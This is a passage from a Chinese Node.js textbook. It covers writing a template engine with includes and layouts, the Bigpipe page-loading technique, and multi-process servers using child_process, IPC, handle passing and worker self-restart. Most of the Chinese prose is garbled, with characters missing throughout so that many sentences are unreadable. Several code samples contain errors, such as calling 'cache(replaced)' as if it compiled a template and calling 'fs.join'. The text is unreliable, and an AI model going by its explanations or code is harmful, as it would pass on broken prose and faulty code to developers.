 '<h2>< =user.name ></h2>',
%% '< % } else { %>',  '<h2>名用户</h2>', '< % } %>'].join(' \n'); 
EJS中，它的量不是obj，是locals，这的与中的with语有关。新上的，到的为
<h2>名用户</h2> 
外，实了的还能环，下
var tpl = [ '< % for (var i = 0; i < items.length; i++) { %>',  '< var % item = items[i]; >', 
% '<p>< = % i+1 %><=item.name></p>',
%% 
'< % } %>' ].join('\n'); render(complie(tpl), {items: [{name: 'Jackson'}, {name: ''}]}); 
到的下
<p>1Jackson</p> <p>2</p>
，我们实的已经能了，图的不问题。
4. 
前我们实的complie()render()数已经能实入的编的能。与前的HTTP应对组起的，我们应一个客端的请大下
app.get('/path', function (req, res) { fs.readFile('file/path', 'utf8', function (err, text) { 
 if (err) { res.writeHead(500, {'Content-Type': 'text/html'}); res.end('模板文件错误'); return; 
}  res.writeHead(200, {'Content-Type': 'text/html'});  var html = render(complie(text), data);  res.end(html); 
}); }); 
这样的应并不友好，有下几。次请要反复读上的。次请要编。用。你性不的，应大多数的MVC在做时都只有一个的render()
，以我们也要一个、性能好的render()数，下
var cache = {}; var VIEW_FOLDER = '/path/to/wwwroot/views'; 
res.render = function (viewname, data) { 
if (!cache[viewname]) {  var text;  try { 
text = fs.readFileSync(path.join(VIEW_FOLDER, viewname), 'utf8');  } catch (e) { 
res.writeHead(500, {'Content-Type': 'text/html'}); res.end('模板文件错误'); return; 
} 
 cache[viewname] = complie(text); } var complied = cache[viewname]; res.writeHead(200, {'Content-Type': 'text/html'}); var html = complied(data); res.end(html); 
}; 
这个res.render()实中，有读的情，是由于用了，只会在一次读的时候个程的，一生，不会反复读。次，之前已经了编，也不会次读都编。
数之后，我们的用就很了，下
app.get('/path', function (req, res) { res.render('viewname', {}); }); 
与系统之后，入，可以很好解决性能问题，接也大大到。由于内都不大，也不于动动的，以使用程的内编，并不会起大的收问题。
5. 
有时候大，过复杂，会加上的，且有些是可以用的，这生了（Partial View）的产生。可以在的中，多个可以入一个中。多个复杂的大的本要很多，很多复杂问题可以解为多个小的问题。
这我们用include关实的。下
<ul> <% users.forEach(function(user){ %> <%  include user/show %> <% }) %> </ul> 
user/show内下
<li>< =user.name ></li>
%%
的应以下的
<ul> <% users.forEach(function(user){ %>  <li>< =user.name %></li> 
% <% }) %> </ul> 
以实的就是include语，性编，下
var files = {}; 
var preComplie = function (str) { var replaced = %
str.replace(/<%\s+(include.*)\s+ >/g, function (match, code) {  var partial = code.split(/\s/)[1];  if (!files[partial]) { 
files[partial] = fs.readFileSync(fs.join(VIEW_FOLDER, partial), 'utf8'); }  return files[partial]; 
}); 
// 多套续换if (str.match(/<%\s+(include.*)\s+ >/)) {
%
 return preComplie(replaced); } else {  return replaced; } }; 
后我们一下complie()数，在编前，下
var complie = function (str) { // 解析子模板str = preComplie(str); var tpl = str.replace(/\n/g, '\\n') // 将换行符换.replace(/< =([% \s\S]+?) >/g, function (match, code) { 
%
 //转义 return "' + escape(" + code + ") + '"; }).replace(/< =([\s\S]+?) >/g, function (match, code) {
%% 
 //正常输出 return "' + " + code + "+ '"; }).replace(/< ([% \s\S]+?) >/g, function (match, code) { 
%
 //执行代码
 return "';\n" + code + "\ntpl += '"; }).replace(/\'\n/g, '\'') .replace(/\n\'/gm, '\''); 
tpl = "tpl = '" + tpl + "';"; // 转换空行tpl = tpl.replace(/''/g, '\'\\n\''); tpl = 'var tpl = "";\nwith (obj || {}) {\n' + tpl + '\n}\nreturn tpl;'; return new Function('obj', 'escape', tpl); 
}; 
6. 
要是为了用的复杂。的一使用就是图
（layout），图页，它与的相，是场景有区。一言定了，它的就了，入到多个中于，是在多个中只是入的图不，内一样，也会复。下个的
//模板1 <ul> 
<% users.forEach(function(user){ %> <%  include user/show %> 
<% }) %> </ul> //模板2 <ul> 
<% users.forEach(function(user){ %> <%  include profile %> <% }) %> </ul> 
这些复的内要用，为了能这些用起，技术图。图之后，就只有一，图时，定好图就可以了，下
res.render('viewname', { layout: 'layout.html', users: [] 
}); 
对于，我们为<%- body %>部分为我们的，下
<ul> <% users.forEach(function(user){ %> <%-body %> <% }) %> </ul> 
下
var renderLayout = function (str, viewname) { return str.replace(/<%-\s*body\s* >/g, function (match, code) { 
%
 if (!cache[viewname]) { 
cache[viewname] = fs.readFileSync(fs.join(VIEW_FOLDER, viewname), 'utf8'); }  return cache[viewname]; 
}); }; 
最res.render()数，下
res.render = function (viewname, data) { var layout = data.layout; if (layout) {
 if (!cache[layout]) { try { cache[layout] = fs.readFileSync(path.join(VIEW_FOLDER, layout), 'utf8'); 
} catch (e) { res.writeHead(500, {'Content-Type': 'text/html'}); res.end('布局文件错误'); return; 
} 
} } var layoutContent =%
 cache[layout] || '<%-body >';
var replaced;
try {  replaced = renderLayout(layoutContent, viewname); 
} catch (e) { res.writeHead(500, {'Content-Type': 'text/html'});  res.end('模板文件错误');  return; 
} // 将模板和布局文件名做key缓存var key = viewname + ':' + (layout || ''); if (!cache[key]) { 
 //编译模板
 cache[key] = cache(replaced); } res.writeHead(200, {'Content-Type': 'text/html'}); var html = cache[key](data); res.end(html); 
}; 
，我们可以实用，下
res.render('user', { layout: 'layout.html', users: [] 
}); //者res.render('profile', { 
layout: 'layout.html', users: [] }); 
7. 
从前的实中我们可以到一些的优，要有下几。. 。. 编后的数。上个之后，的性能与生的数接相关，这个数与的复杂
有接关系。在中编写了，的性能接的性能。优就是对性能的优，以加入一优
中的式
了这几个的外，的实也与性能相关。本的实中用了new Function()，事实上还可以使用eval()对于，本中用的是接相加，有的用数组的，最后有相。对于量的，本用的是with作用的实了，有的用了本一，定量的（obj. username），定量不用with可以上下。这些都是的因。由于有数量多，不做。
8. 
技术的，务开发与HTML的工作分开，它的就是一。这与MVC中的数、、图分一，与前端HTML、CSS、JavaScript分的一，、、分开。着Node的，能在前后端用实在是不过的事情，甚至都不用复实。本了的本，今样的不的性性能。最的有EJS、Jade，它们在语言的上不相，EJS是ASP、PHP、JSP的，JadePython、Ruby的。
本了技术的实，读者可以本的实自己的，也可以使用EJS、Jade熟的，了上的，还有过能。
8.5.4Bigpipe 
这个与在4中到的Bagpipe相，不过Bagpipe的为，是用于用的。的Bigpipe是产生于Facebook的前端加技术，它的要是为了解决数页的加问题，在2010年的Velocity会上，时自Facebook的生分享了题，后起了国内大的反。
这以一个的下前到的MVC技术在的问题
app.get('/profile', function (req, res) { db.getData('sql1', function (err, users) { db.getData('sql2', function (err, articles) { 
res.render('user', { layout: 'layout.html', users: users, articles: articles 
});  }); }); }); 
这个中，我们profile页要usersarticles数，后过layout user，最发页到端。可能的，的数过EventProxy解开，下
app.get('/profile', function (req, res) { var ep = new EventProxy(); ep.all('users', 'articles', function (users, articles) { 
 res.render('user', { layout: 'layout.html', users: users, articles: articles 
 }); }); ep.fail(function (err) { 
 res.render('err', {message: err.message}); }); db.getData('sql1', ep.done('users')); db.getData('sql2', ep.done('articles')); 
}); 
至还在的问题是
问题在于我们的页，最的HTML要在有的数后才到端。Node过已经多个数源的并起了，最的页决于个数请中应时的个。在数应之前，用到的是页，这是分不友好的用。
Bigpipe的解决是页分多个部分（pagelet），用没有数的（），个部分到前端，最，个网页的。这个过程中要前端JavaScript的与，它后续的数到页上。
Bigpipe是一个要前后端实的优技术，这个技术有几个要的。
页（数的）。
后端续性的数。
前端。
Bigpipe的程图图8-8。

图 8-8 Bigpipe 的程图

1.

页由后端，下
var cache = {}; var layout = 'layout.html';
app.get('/profile', function (req, res) { if (!cache[layout]) { cache[layout] = fs.readFileSync(path.join(VIEW_FOLDER, layout), 'utf8'); }
res.writeHead(200, {'Content-Type': 'text/html'}); res.write(render(complie(cache[layout]))); // TODO
});
这个中要入要的前端脚本，jQuery、Underscore 用，次要入我们要的前端脚本，这的为 bagpipe.js。下
// layout.html <!DOCTYPE html> <html>

<head> <title>Bagpipe</title> <script src="jquery.js"></script> <script src="underscore.js"></script> <script src="bigpipe.js"></script> 
</head> 
<body> <div id="body"></div> <script type="text/template" id="tpl_body">
 <div>< =articles %></div> 
% 
</script> <div id="footer"></div> <script type="text/template" id="tpl_footer"> 
 <div>< =users %%></div> 
</script> </body> </html> <script> 
var bigpipe = new Bigpipe(); bigpipe.ready('articles', function (data) {
 $('#body').html(_.render($('#tpl_body').html(), {articles: data})); }); bigpipe.ready('copyright', function (data) { 
 $('#footer').html(_.render($('#tpl_footer').html(), {users: data})); }); </script> 
2. 
后，个网页的并没有，用已经可以到个页的大样。接下我们继续数，与的数不，这的数之后要前端脚本，是要对它，下
app.get('/profile', function (req, res) { if (!cache[layout]) {  cache[layout] = fs.readFileSync(path.join(VIEW_FOLDER, layout), 'utf8'); } 
res.writeHead(200, {'Content-Type': 'text/html'}); res.write(render(complie(cache[layout]))); ep.all('users', 'articles', function () { 
 res.end(); }); ep.fail(function (err) { 
 res.end(); }); db.getData('sql1', function (err, data) { 
 data = err ? {} : data; 
 res.write('<script>bigpipe.set("articles", ' + JSON.stringify(data) + ');</script>'; }); db.getData('sql2', function (err, data) { 
 data = err ? {} : data;  res.write('<script>bigpipe.set("copyright", ' + JSON.stringify(data) + ');</script>'; }); }); 
对于要到页上的数，它的下
res.write('<script>bigpipe.set("articles", ' + JSON.stringify(data) + ');</script>'; 
这样最HTML的上还应有下这样的
<script>bigpipe.set("articles", "I am article");</script> <script>bigpipe.set("copyright", "I am copyright");</script>
这的序决于次用。由于Node的性，多次用可以并，就可以推到HTML页上，着前端脚本的，就可以到页上。
相Facebook始的Bigpipe应用在PHP这环境中，Node在数上可以并，使Bigpipe。
3. 
前的bigpipe.ready()bigpipe.set()是个前端的机，前者以一个key一个事，后者触发一个事，以页的机。这个数定在bigpipe.js中，下
var Bigpipe = function () { this.callbacks = {}; }; 
Bigpipe.prototype.ready = function (key, callback) { if (!this.callbacks[key]) {
 this.callbacks[key] = []; } this.callbacks[key].push(callback); 
}; 
Bigpipe.prototype.set = function (key, data) { var callbacks = this.callbacks[key] || []; for (var i = 0; i < callbacks.length; i++) { 
 callbacks[i].call(this, data); } }; 
4. 
Bigpipe网页数分，使用在上网页前好了，着数的过程页，使用能到页是活的。这一开始页，后在个时候好用的好。Node在这个过程中，性使数的能并，数的与数用的序关，用的数可以到页中，这个性使Bigpipe。
要Bigpipe这样页的过程，实过Ajax也能，是Ajax的后是HTTP用，要多的网接，Bigpipe数与前页用相的网接，开分小。Bigpipe要的多，MVC中的接要复杂多，在网要的且数请时的页中使用。
## 8.6 总结
本的内为，在Web应用的个过程中，从请到应请的个过程都有性，本就可以一个能的Web开发。过的Web技术，着的，开发者应用，不的实，这好没有图在。本的内能为Node开发者图的发，在开发Web应用时能心有，了。
在熟的Web有Connect、Express，本中的内在这些中都有实，因为的因，本中的实为，实使用请使用这些熟的。
## 8.7 参考资源
本章参考的资源如下：
- http://tools.ietf.org/html/rfc3875 
- http://tools.ietf.org/html/rfc2069 
- http://www.ietf.org/rfc/rfc1867.txt 
- http://en.wikipedia.org/wiki/Cross-site_request_forgery 
- https://github.com/senchalabs/connect/blob/master/lib/middleware/csrf.js 
- http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller 
- http://www.ibm.com/developerworks/webservices/library/ws-restful/ 
- http://en.wikipedia.org/wiki/Middleware 
- http://mustache.github.io/ 
- https://github.com/joyent/node/wiki/modules#wiki-templating 
- https://developer.mozilla.org/zh-CN/docs/JavaScript/Reference/Global_Objects/Function

# 第 9 章 玩转进程

Node 在时决定在 V8 之上，也就着它的与。我们的 JavaScript 会在个程的个线程上。它的好是程序是一的，在没有多线程的情下没有、线程问题，作系统在时也因为上下的，可以很好高 CPU 的使用。
是程线程并的，今 CPU 本是多的，的服务（VPS）还有多个 CPU。一个 Node 程只能用一个，这 Node 实应用的一个问题 CPU
外，由于 Node 在线程上，一线程上的没有，会起个程的。这 Node 的实应用了个问题的定在这个问题中，前者只是用不的问题，后者对于实产品一定的。本关于程的会解决这个问题。
从的上言，Node 并的线程，在 3 中我们有过 Node 自还有一定的 I/O 线程在，这些 I/O 线程由 libuv，这部分线程对于 JavaScript 开发者言是的，只在 C++开发时才会关到。JavaScript 在 V8 上，是线程的。本 JavaScript 部分开，以的。

## 9.1 服务模型的变迁

从到今，Web 服务的已经了几次。服务客端请的并发量，就是个程的。
9.1.1
最的服务，是的，它的服务是一次只为一个请服务，有请都次序服务。这了前的请外，余请都于的。它的能相下，次应服务用的时定为 N，这服务的 QPS 为 1/N。
这今已本淘，只在一些并发要的应用中在。
9.1.2
为了解决的并发问题，一个的是过程的复时服务多的请用。这样个接都要一个程服务，100 个接要动 100 个程服务，这是的。在程复的过程中，要复程内部的，对于个接都这样的复的，相的会在内中在很多，。并且这个过程由于要复多的数，动是为的。
为了解决动的问题，复（prefork）入服务中，复一定数量的程。时程复用，程创、的开。是这个并不性，一并发请过高，内使用着程数的会。
过复复的的服务有源的，且程数上为 M，这服务的 QPS 为 M/N。
9.1.3
为了解决程复中的问题，多线程入服务，一个线程服务一个请。线程相对程的开要小多，并且线程之可以享数，内的问题可以到解决，并且用线程可以创线程的开。是多线程的并发问题只能多程好，因为个线程都有自己立的，这个都要用一定的内。外，由于一个 CPU 心在一个时只能做一事情，作系统只能过 CPU 分为时的，线程可以为使用 CPU 源，是作系统内在线程的时也要线程的上下，线程数量过多时，时会用在上下中。以在大并发量时，多线程还是做到强大的性。
多线程上下的开，线程用的源为程的 1/L，源上的，它的 QPS 为 M \* L/N。
9.1.4
多线程的服务服了很一时，Apache 就是用多线程/多程实的，并发到上时，内用的问题会，这是的 C10k 问题。
为了解决高并发问题，于事驱动的服务了，像 Node 与 Nginx 是于事驱动的实的，用线程了不要的内开上下开。
于事的服务在的问题是本起始时的个问题 CPU 的用程的性。线程的并不，中以 PHP 最为——在 PHP 中没有线程的。它的性是由它个请都立立的上下实的。是对于 Node，有请的上下都是统一的，它的定性是解决的问题。
由于有都在线程上，事驱动服务性能的在于 CPU 的能，它的上决定这服务的性能上，它不多程多线程中源上的，可性前者高。解决多 CPU 的用问题，的性能上是可的。

## 9.2 多进程架构

对程线程对多使用不的问题，前人的经是动多程可。想下个程自用一个 CPU，以实多 CPU 的用。，Node 了 child_process，并且也了 child_process.fork()数我们实程的复。
我们一次经的为 worker.js，下
var http = require('http');
http.createServer(function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n');
}).listen(Math.round((1 + Math.random()) * 1000), '127.0.0.1');
过 node worker.js 动它，会 1000 到 2000 之的一个机端。以下为 master.js，并过 node master.js 动它
var fork = require('child_process').fork; var cpus = require('os').cpus(); for (var i = 0; i < cpus.length; i++) {
fork('./worker.js'); }
这会前机上的 CPU 数量复对应 Node 程数。在*nix 系统下可以过 ps
aux | grep worker.js 到程的数量，下
\$ ps aux | grep worker.js jacksontian 1475 0.0 0.0 2432768 600 s003 S+ 3:27AM 0:00.00 grep worker.js jacksontian 1440 0.0 0.2 3022452 12680 s003 S 3:25AM 0:00.14 /usr/local/bin/node ./worker.js jacksontian 1439 0.0 0.2 3023476 12716 s003 S 3:25AM 0:00.14 /usr/local/bin/node ./worker.js jacksontian 1438 0.0 0.2 3022452 12704 s003 S 3:25AM 0:00.14 /usr/local/bin/node ./worker.js jacksontian 1437 0.0 0.2 3031668 12696 s003 S 3:25AM 0:00.15 /usr/local/bin/node ./worker.js
图 9-1 就是的 Master-Worker，从。图 9-1 中的程分为程工作程。这是的分中用于并务的，好的可性定性。程不的务，是管工作程，它是于定的。工作程的务，因为务的多多样，甚至一务由多人开发，以工作程的定性开发者关。

图 9-1 Master-Worker
过 fork()复的程都是一个立的程，这个程中有着立新的 V8 实。它要至 30 的动时至 10 MB 的内。管 Node 了 fork()我们复程使个 CPU 内都使用上，是要 fork()程是的。好在 Node 过事驱动的在线程上解决了大并发的问题，这动多个程只是为了分 CPU 源用起，不是为了解决并发问题。
9.2.1
child_processNode 可以创程（child_process）的能。它了 4 个用于创程。
. spawn()动一个程。
. exec()动一个程，与 spawn()不的是接不，它有一个数程的。
. execFile()动一个程可。

. fork()与 spawn()，不在于它创 Node 的程只定要的 JavaScript 可。spawn()与 exec()、execFile()不的是，后者创时可以定 timeout 性时时，一创的程过定的时会。
exec()与 execFile()不的是，exec()已有的，execFile()。这我们以一个为，node worker.js 分用上 4 实，下
var cp = require('child_process');
cp.spawn('node', ['worker.js']);
cp.exec('node worker.js', function (err, stdout, stderr) {
// some code
});
cp.execFile('worker.js', function (err, stdout, stderr) {
// some code
});
cp.fork('./worker.js');
以上 4 个在创程之后会程对。它们的可以过 9-1。
9-14
/
spawn() × ×

exec()
√ √ execFile() √ 可 √ fork() × Node JavaScript×
这的可是可以接的，是 JavaScript 过 execFile()，它
图灵社区会员 Eric Liu(guangqiang.dev@gmail.com)专享 尊重版权
的内加下
#!/usr/bin/env node
管 4 创程的有些，事实上后 3 都是 spawn()的应用。
9.2.2
在 Master-Worker 中，要实程管工作程的能，要程工作程之的信。对于 child_process，创好了程，后与程信是分的。
在前端中，JavaScript 线程与 UI 用一个线程。JavaScript 的时候 UI 是的，UI 时，JavaScript 是的，者相。时 JavaScript 会 UI 不应。为了解决这个问题，HTML5 了 WebWorkerAPI。WebWorker 创工作线程并在后，使一些为的不线程上的 UI。它的 API 下
var worker = new Worker('worker.js'); worker.onmessage = function (event) { document.getElementById('result').textContent = event.data; };
中，worker.js 下
var n = 1;
search: while (true) { n += 1; for (var i = 2; i <= Math.sqrt(n); i += 1)
if (n % i == 0)
continue search; // found a prime postMessage(n);
}
线程与工作线程之过 onmessage()postMessage()信，程对由 send()实程程发数，message 事实收程发的数，与 API 在一定程上相。过内，不是享接作相关源，这是为量的做。
Node 中对应下
// parent.js
var cp = require('child_process'); var n = cp.fork(\_\_dirname + '/sub.js');
n.on('message', function (m) { console.log('PARENT got message:', m); });
n.send({hello: 'world'});
// sub.js
process.on('message', function (m) {
console.log('CHILD got message:', m);
});
process.send({foo: 'bar'});
过 fork()者他 API，创程之后，为了实程之的信，程与程之会创 IPC。过 IPC，程之才能过 messagesend()。
.
IPC 的是 Inter-Process Communication，程信。程信的目的是为了不的程能相问源并工作。实程信的技术有很多，管、管、socket、信量、享内、、Domain Socket。Node 中实 IPC 的是管（pipe）技术。管管，在 Node 中管是个的，实由 libuv，在 Windows 下由管（named pipe）实，\*nix 系统用 Unix Domain Socket 实。在应用上的程信只有的 message 事 send()，接分。图 9-2 为 IPC 创实的图。

图 9-2 IPC 创实图
程在实创程之前，会创 IPC 并它，后才创程，并过环境量（NODE_CHANNEL_FD）程这个 IPC 的。程在动的过程中，接这个已在的 IPC，从程之的接。图 9-3 为创 IPC 管的图。

图 9-3 创 IPC 管的图
立接之后的程就可以自由信了。由于 IPC 是用管 Domain Socket 创的，它们与网 socket 的为，于信。不的是它们在系统内中就了程的信，不用经过实的网，高。在 Node 中，IPC 为 Stream 对，在用 send()时发数（于 write()），接收到的会过 message 事（于 data）触发应用。
有的 Node 据 IPC 的无定创的 IPC。
9.2.3
立好程之的 IPC 后，仅仅只用发一些的数，不我们的实应用使用。还本一部分要动的服务分自的端，服务都到相的端，会有样的下
var http = require('http');
http.createServer(function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n');
}).listen(8888, '127.0.0.1');
次动 master.js，下
events.js:72 throw er; // Unhandled 'error' event ^ Error: listen EADDRINUSE at errnoException (net.js:884:11)
这时只有一个工作程能到端上，余的程在的过程中都了 EADDRINUSE，这是端用的情，新的程不能继续端了。这个问题了我们多个程一个端的想。要解决这个问题，的做是个程不的端，中程端（80），程对外接收有的网请，这些请分到不的端的程上。图图 9-4。

图 9-4 程接收、分网请的图
过，可以端不能复的问题，甚至可以在程上做的，使个程可以为务。由于程接收到一个接，会用一个，因中客端接到程，程接到工作程的过程要用个
。作系统的是有的，一数量的的做了系统的能。为了解决上这样的问题，Node 在本 v0.5.9 入了程发的能。send()了能过 IPC 发数外，还能发，个可数就是，下
child.send(message, [sendHandle])
是是一可以用识源的用，它的内部包了对的。可以用识一个服务端 socket 对、一个客端 socket 对、一个 UDP 接、一个管。
发着在前一个问题中，我们可以这，使程接收到 socket 请后，这个 socket 接发工作程，不是新与工作程之立新的 socket 接发数。的问题可以过这样的解决。我们的。
程下
var child = require('child_process').fork('child.js');
// Open up the server object and send the handle var server = require('net').createServer(); server.on('connection', function (socket) {
socket.end('handled by parent\n'); }); server.listen(1337, function () {
child.send('server', server); });
程下
process.on('message', function (m, server) { if (m === 'server') { server.on('connection', function (socket) { socket.end('handled by child\n'); }); } });
这个中接一个 TCP 服务发了程。这是起不可的事情，我们测试一，，下
//先启动服务器$ node parent.js  
后新开一个，用上curl工，下
$ curl "http://127.0.0.1:1337/" handled by parent $ curl "http://127.0.0.1:1337/" 
handled by child $ curl "http://127.0.0.1:1337/" handled by child $ curl "http://127.0.0.1:1337/" handled by parent 
中的应也是很不可的，这程程都有可能我们客端发起的请。试试服务发多个程，下
// parent.js 
var cp = require('child_process'); var child1 = cp.fork('child.js'); var child2 = cp.fork('child.js'); 
// Open up the server object and send the handle var server = require('net').createServer(); server.on('connection', function (socket) { 
socket.end('handled by parent\n'); }); server.listen(1337, function () { 
child1.send('server', server); child2.send('server', server); }); 
后在程中程ID，下
// child.js 
process.on('message', function (m, server) { if (m === 'server') {  server.on('connection', function (socket) { socket.end('handled by child, pid is ' + process.pid + '\n');  }); } }); 
用curl测试我们的服务，下
$ curl "http://127.0.0.1:1337/" handled by child, pid is 24673 $ curl "http://127.0.0.1:1337/" handled by parent $ curl "http://127.0.0.1:1337/" handled by child, pid is 24672
测试的是次的都可能不，可能程，也可能不的程。并且这是在 TCP 上的事情，我们试到 HTTP 试试。对于程言，我们甚至想要它量一，是否服务发程之后，就可以关服务的，程请
我们对程动，下
// parent.js
var cp = require('child_process');
var child1 = cp.fork('child.js'); var child2 = cp.fork('child.js');
// Open up the server object and send the handle var server = require('net').createServer(); server.listen(1337, function () {
child1.send('server', server); child2.send('server', server); // 关 server.close();
});
后对程动，下
// child.js var http = require('http'); var server = http.createServer(function (req, res) {
res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('handled by child, pid is ' + process.pid + '\n'); });
process.on('message', function (m, tcp) { if (m === 'server') { tcp.on('connection', function (socket) { server.emit('connection', socket); }); } });
新动 parent.js 后，次测试，下
$ curl "http://127.0.0.1:1337/" handled by child, pid is 24852 $ curl "http://127.0.0.1:1337/" handled by child, pid is 24851
这样一，有的请都是由程了。个过程中，服务的过程发生了一次，图 9-5。

图 9-5 程请发工作程
程发并关之后，为了图 9-6 的。

图 9-6 程发并关后的
我们发，多个程可以时相端，没有 EADDRINUSE 发生了。

1.

上的是发，是，发我们接服务对发程有没有它是否的服务对发了程为它可以发到多个程中发程为程中还在这个对本开这些的在。
目前程对 send()可以发的包括下几。
. net.Socket。TCP 接。
. net.Server。TCP 服务，立在 TCP 服务上的应用服务都可以享到它的好。
. net.Native。C++的 TCP 接 IPC 管。
. dgram.Socket。UDP 接。
. dgram.Native。C++的 UDP 接。

send()在发到 IPC 管前，组个对，一个数是 handle，一个是 message。message 数下
{
cmd: 'NODE*HANDLE',
type: 'net.Server',
msg: message
}
发到 IPC 管中的实上是我们要发的，实上是一个数。这个 message 对在写入到 IPC 管时也会过 JSON.stringify()序。以最发到 IPC 中的信都是，send()能发并不着它能发对。
接了 IPC 的程可以读到程发的，过 JSON.parse()解还为对后，才触发 message 事应用使用。在这个过程中，对还要过，message.cmd 的以 NODE*为前，它应一个内部事 internalMessage。message.cmd 为 NODE_HANDLE，它 message.type 到的一起还一个对应的对。这个过程的图图 9-7。

图 9-7 的发与还图
以发的 TCP 服务为，程收到后的还过程下
function(message, handle, emit) { var self = this;
var server = new net.Server(); server.listen(handle, function() { emit(server); }); }
上的中，程 message.type 创对应 TCP 服务对，后到上。由于不应用，以在程中，开发者会有一服务就是从程中接过的。的是，Node 程之只有，不会对，这是的。
目前 Node 只上到的几，并的都能在程之，它有的发还的过程。

2.

在了解了后的后，我们继续探为过发后，多个程可以到相的端不起 EADDRINUSE。也很，我们立动的程中，TCP 服务端 socket 接的并不相，到相的端时会。
Node 对个端都了 SO_REUSEADDR，这个的是不程可以就相的网端，这个服务端接可以不的程复用，下
setsockopt(tcp->io_watcher.fd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on))
由于立动的程相之并不，以相端时就会。对于 send()发的还的服务言，它们的是相的，以相端不会起。
多个应用相端时，一时只能个程用。言之就是网请服务端发时，只有一个的程能到接，也就是只有它能为这个请服务。这些程服务是的。
9.2.4
至，我们了创程、程信的 IPC 实、在程的发还、
端用。过这些技术，用 child_process 在机上 Node 是相对的事情。因在多 CPU 的环境下，Node 程能分用源不是题。

## 9.3 集群稳定之路

好了，分用了多 CPU 源，就可以接客端大量的请了。请，
我们还有一些要。性能问题。多个工作程的活管。工作程的。
者数的动新入。他。是的，我们创了很多工作程，个工作程是在线程上的，它的定
性还不能到的。我们要立起一个的机 Node 应用的性。
9.3.1
次到程对上，了人关的 send()message 事外，程还有些了 message 事外，Node 还有下这些事。
. error 程复创、、发时会触发事。
. exit 程时触发事，程是，这个事的一个数为，否为 null。程是过 kill()的，会到个数，它程时的信。
. close 在程的入中时触发事，数与 exit 相。
. disconnect 在程程中用 disconnect()时触发事，在用时关 IPC。

上这些事是程能到的与程相关的事。了 send()外，还能过 kill()程发。kill()并不能过 IPC 相的程，它只是程发了一个系统信。认情下，程过 kill()程发一个 SIGTERM 信。它与程认的 kill()，下
//子进程 child.kill([signal]); //当前进程 process.kill(pid, [signal]);
它们一个发程，一个发目程。在 POSIX 中，有一的信系统，在中 kill -l 可以到的信，下
\$ kill -l

1.  SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP 6) SIGABRT 7) SIGEMT 8) SIGFPE
2.  SIGKILL 10) SIGBUS 11) SIGSEGV 12) SIGSYS
3.  SIGPIPE 14) SIGALRM 15) SIGTERM 16) SIGURG
4.  SIGSTOP 18) SIGTSTP 19) SIGCONT 20) SIGCHLD
5.  SIGTTIN 22) SIGTTOU 23) SIGIO 24) SIGXCPU
6.  SIGXFSZ 26) SIGVTALRM 27) SIGPROF 28) SIGWINCH 29) SIGINFO 30) SIGUSR1 31) SIGUSR2
    Node 了这些信对应的信事，个程都可以这些信事。这些信事是用程的，个信事有不的，程在收到应信时，应做定的为，SIGTERM 是信，程收到信时应。下
    process.on('SIGTERM', function() { console.log('Got a SIGTERM, exiting...'); process.exit(1);
    });
    console.log('server running with PID:', process.pid); process.kill(process.pid, 'SIGTERM');
    9.3.2
    有了程之的相关事之后，就可以在这些关系之创要的机了。至我们能过程的 exit 事的信，接着前的多程，我们在程上要加入一些程管的机，新动一个工作程继续服务。图图 9-8。

图 9-8 程加入程管机的图
实下
// master.js var fork = require('child_process').fork; var cpus = require('os').cpus();
var server = require('net').createServer(); server.listen(1337);
var workers = {};
var createWorker = function () { var worker = fork(\_\_dirname + '/worker.js'); // 出时重启动的进程
worker.on('exit', function () { console.log('Worker ' + worker.pid + ' exited.'); delete workers[worker.pid]; createWorker();
}); // 句柄转发 worker.send('server', server); workers[worker.pid] = worker; console.log('Create worker. pid: ' + worker.pid);
};
for (var i = 0; i < cpus.length; i++) { createWorker(); }
//进程自出时有工作进程出 process.on('exit', function () { for (var pid in workers) { workers[pid].kill(); } });
测试一下上的，下
$ node master.js Create worker. pid: 30504 Create worker. pid: 30505 Create worker. pid: 30506 Create worker. pid: 30507 
过kill个程试试，下
$ kill 30506
是 30506 程后，自动动了一个新的工作程 30518，程数量并没有发生
，下
Worker 30506 exited. Create worker. pid: 30518
在这个场景中我们动了一个程，在实务中，可能有的 bug 工作程，我们要这，下
// worker.js var http = require('http'); var server = http.createServer(function (req, res) {
res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('handled by child, pid is ' + process.pid + '\n'); });
var worker; process.on('message', function (m, tcp) {
if (m === 'server') { worker = tcp; worker.on('connection', function (socket) {
server.emit('connection', socket); }); } });
process.on('uncaughtException', function () { // 接收的接 worker.close(function () {
//有有接开出进程 process.exit(1); }); });
上的程是，一有的，工作程就会立接收新的接有接开后，程。程在到工作程的 exit 后，会立动新的程服务，以个中是有程在为用服务的。

1.

上在的问题是要到已有的有接开后程才，在极端的情下，有工作程都接收新的接，在的。在到程才的过程中，有新的请可能在没有工作程为新用服务的情景，这会大部分请。
为要这个过程，不能到工作程后才新的工作程。也不能程，因为这样会已接的用接开。于是我们在的程中加一个自
（suicide）信。工作程在要时，程发一个自信，后才接收新的接，有接开后才。程在接收到自信后，立创新的工作程服务。动下
// worker.js
process.on('uncaughtException', function (err) { process.send({act: 'suicide'}); // 接收的接 worker.close(function () {
//有有接开出进程 process.exit(1); }); });
程工作程的务，从 exit 事的数中到 message 事的数中，下
var createWorker = function () { var worker = fork(\_\_dirname + '/worker.js'); // 启动的进程 worker.on('message', function (message) {
if (message.act === 'suicide') { createWorker();
} }); worker.on('exit', function () {
console.log('Worker ' + worker.pid + ' exited.');
delete workers[worker.pid]; }); worker.send('server', server); workers[worker.pid] = worker; console.log('Create worker. pid: ' + worker.pid);
};
为了的，我们工作程的为，一有用请，就会有一个可的工作程，下
var server = http.createServer(function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('handled by child, pid is ' + process.pid + '\n'); throw new Error('throw exception');
});
后动有程，下
$ node master.js  Create worker. pid: 48595 Create worker. pid: 48596 Create worker. pid: 48597 Create worker. pid: 48598 
用curl工测试，下
$ curl http://127.0.0.1:1337/ handled by child, pid is 48598
信，下
Create worker. pid: 48602 Worker 48598 exited.
与前一相，创新工作程在前，程在后。在这个可的程之前，是有新的工作程上它的。至我们了程的，一有，程会创新的工作程为用服务，的程一已有接就自动开。个过程使我们的应用的定性性大大高。图图 9-9。

图 9-9 程的自
